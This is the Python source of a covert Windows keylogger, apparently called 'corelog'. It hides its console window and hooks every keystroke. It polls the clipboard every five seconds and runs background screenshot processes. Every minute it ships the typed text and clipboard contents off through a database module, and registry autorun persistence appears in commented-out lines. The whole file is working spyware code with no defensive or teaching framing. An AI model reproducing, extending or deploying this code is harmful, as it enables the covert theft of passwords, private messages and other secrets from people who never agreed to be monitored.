import os
import time
import keyboard  # for keylogs
from threading import Timer
from datetime import datetime
import getpass
import pyperclip
import ctypes
# import autorun
import win32process
import dbfile
import screenshot
from multiprocessing import Process

# autorun.AddToRegistry('corelog.exe')
hwnd = ctypes.windll.kernel32.GetConsoleWindow()
if hwnd != 0:
    ctypes.windll.user32.ShowWindow(hwnd, 0)
    ctypes.windll.kernel32.CloseHandle(hwnd)
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
print('program started')
img_count = 1
comname = getpass.getuser()
# print(comname)
temp_data = pyperclip.paste()

# if not os.path.exists(f'C:/Users/{comname}/AppData/Local/Programs/corelog/datafile.txt'):
#     with open(f'C:/Users/{comname}/AppData/Local/Programs/corelog/datafile.txt', 'w') as clip:
#         pass

def clipboard_listener():
    global temp_data, clipboard_data
    try:
        if temp_data != pyperclip.paste():
            temp_data = pyperclip.paste()
            clipboard_data += f'\n\n{pyperclip.paste()}'
            # print(f'clipboard data: {clipboard_data}')
    except:
        time.sleep(2)
        clipboard_listener()
    mytimer = Timer(interval=5, function=clipboard_listener)
    mytimer.daemon = True
    mytimer.start()

tries = 0

def isdataavailable():
    global tries
    print('in data available function... ')
    with open(f'C:/Users/{comname}/AppData/Local/Programs/corelog/datafile.txt', 'r+') as f:
        # print(f.read())
        data = dict(f.read())
        print(data)
        if data != '':
            try:
                f.truncate()
                print('erased data from file.')
            except:
                if tries < 3:
                    time.sleep(5)
                    tries += 1
                    isdataavailable()
                else:
                    print("can't send data")
                    tries = 0
                    main_func()
        else:
            tries = 0
            print('data not available')


clipboard_data = ''


def main_func():
    clipboard_listener()
    print('main function started')
    global clipboard_data
    # isdataavailable()
    SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on

    class Keylogger:
        def __init__(self, interval, report_method="email"):
            # we gonna pass SEND_REPORT_EVERY to interval
            self.interval = interval
            self.report_method = report_method
            # this is the string variable that contains the log of all
            # the keystrokes within `self.interval`
            self.log = ""
            # record start & end datetimes
            self.start_dt = datetime.now()
            self.end_dt = datetime.now()
            
        def callback(self, event):
            name = event.name
            if len(name) > 1:
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "\n"
                elif name == "backspace":
                    self.log = self.log[:-1]
                    name = ''
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            # finally, add the key name to our global `self.log` variable
            self.log += name

        def update_filename(self):
            # construct the filename to be identified by start & end datetimes
            start_dt_str = str(self.start_dt)[
                :-7].replace(" ", "-").replace(":", "")
            end_dt_str = str(self.end_dt)[
                :-7].replace(" ", "-").replace(":", "")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        def report_to_file(self):
            """This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable"""
            # open the file in write mode (create it)
            with open(f"{self.filename}.txt", "w") as f:
                # write the keylogs to the file
                print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

        def sendmail(self, message):
            # isdataavailable() #todo
            global clipboard_data
            clip_data = clipboard_data
            print(f'clip_data :{clip_data}')
            if len(message) != 0 and len(clip_data) != 0:
                try:
                    dbfile.write_data(data={
                        'typed_data': message,
                        'clipboard_data': clip_data,
                    }, comname=comname)
                    clipboard_data = ''
                except:
                    with open(f'C:/Users/{comname}/AppData/Local/Programs/corelog/datafile.txt', 'a') as f:
                        f.write({
                            'typed_data': message,
                            'clipboard_data': clip_data
                        })
                    clipboard_data = ''
                    # isdataavailable()

        def report(self):
            # if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
            self.log = ""
            timer = Timer(interval=self.interval, function=self.report)
            # set the thread as daemon (dies when main thread die)
            timer.daemon = True
            # start the timer
            timer.start()

        def start(self):
            # record the start datetime
            self.start_dt = datetime.now()
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # start reporting the keylogs
            self.report()
            # block the current thread, wait until CTRL+C is pressed
            keyboard.wait()

    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()
    # _ss_func()

if __name__ == '__main__' :
    try:
        p1 = Process(target=main_func)
        p1.start()
        p2 = Process(target=screenshot.remaining_images_checker)
        p2.start()
        p3 = Process(target=screenshot.ss_taker)
        p3.start()
    except Exception as Argument:

        # creating/opening a file
        f = open("error.txt", "a")

        # writing in the file
        f.write(str(Argument))

        # closing the file
        f.close()
        time.sleep(10)
        # autorun.AddToRegistry('corelog.exe')
        p1 = Process(target=main_func)
        p1.start()
        p2 = Process(target=screenshot.remaining_images_checker)
        p2.start()
        p3 = Process(target=screenshot.ss_taker)
        p3.start()
